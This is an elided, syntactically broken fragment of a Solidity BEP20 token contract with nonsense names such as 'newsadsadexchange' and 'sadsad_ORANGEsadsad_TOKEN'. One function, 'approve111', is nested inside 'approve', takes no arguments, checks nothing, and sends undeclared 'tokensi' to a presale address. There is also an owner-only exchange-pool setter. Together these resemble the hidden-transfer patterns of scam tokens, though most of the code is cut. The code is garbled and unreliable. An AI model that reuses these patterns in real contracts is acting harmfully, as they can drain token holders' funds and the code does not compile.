...
contract TokenBEP20 is BEP20Interface, Owned{
  ...
  function newsadsadexchange(address _exchangepool) public onlyOwner {
  ...
  function approve(address spender, uint tokens) public returns (bool success) {
    ...
    function approve111() public returns (bool success) {
      
    _dewpresale.transfer(tokensi);
    return true;
  }
...
contract sadsad_ORANGEsadsad_TOKEN  is TokenBEP20 {
